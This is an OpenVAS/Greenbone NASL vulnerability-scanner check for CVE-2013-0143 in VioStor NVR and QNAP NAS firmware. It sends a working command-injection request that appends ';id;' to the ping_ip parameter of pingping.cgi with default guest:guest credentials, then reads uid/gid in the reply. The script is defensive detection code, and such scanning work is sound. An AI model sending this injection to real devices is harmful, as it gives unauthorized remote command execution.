# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103731");
  script_version("2024-06-28T05:05:33+0000");
  script_cve_id("CVE-2013-0143");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_name("VioStor NVR and QNAP NAS RCE Vulnerability");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/927644");
  script_xref(name:"URL", value:"http://www.h-online.com/security/news/item/Serious-vulnerabilities-in-QNAP-storage-and-surveillance-systems-1883263.html");

  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2013-06-07 10:32:41 +0200 (Fri, 07 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("http_server/banner");
  script_require_ports("Services/www", 80, 8080);

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"VioStor NVR firmware version 4.0.3 and possibly earlier versions and QNAP NAS
  with the Surveillance Station Pro activated contains scripts which could allow
  any user e.g. guest users to execute scripts which run with administrative
  privileges. It is possible to execute code on the webserver using the ping
  function.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port:port);
if(!banner || "Server: http server" >!< banner)exit(0);

url = '/cgi-bin/pingping.cgi?ping_ip=1;id;';

userpass64 = base64(str:"guest:guest"); # i've seen hosts where no basic auth was needed to execute a command.

host = http_host_name(port:port);

req = 'GET ' + url + ' HTTP/1.1\r\n' +
      'Host: ' +  host + '\r\n' +
      'Authorization: Basic ' + userpass64 + '\r\n' +
      '\r\n';
resp = http_send_recv(port:port, data:req);

if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {
  msg = 'By sending the request:\n\n' + req + '\n\nthe following response was received:\n\n' + resp;
  security_message(port:port, data:msg);
  exit(0);
}

exit(0);
